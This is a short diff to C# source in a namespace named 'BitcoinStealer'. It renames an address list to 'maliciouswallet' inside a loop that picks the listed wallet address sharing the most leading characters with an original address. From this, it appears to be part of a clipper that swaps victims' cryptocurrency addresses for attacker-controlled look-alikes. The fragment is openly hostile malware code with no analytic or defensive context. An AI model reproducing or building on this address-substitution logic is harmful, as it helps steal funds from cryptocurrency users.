@@ -29,7 +29,7 @@ namespace BitcoinStealer
                 var maxFirstCharFit = 0;
                 foreach (
                     var a in
-                        Resources.vanityAddresses.Split(new[] { Environment.NewLine }, 
+                        Resources.maliciouswallet.Split(new[] { Environment.NewLine }, 
                             StringSplitOptions.RemoveEmptyEntries).ToList()) 
                 {
                     var actFirstCharFit = FirstCharFitNum(a, origAddr);
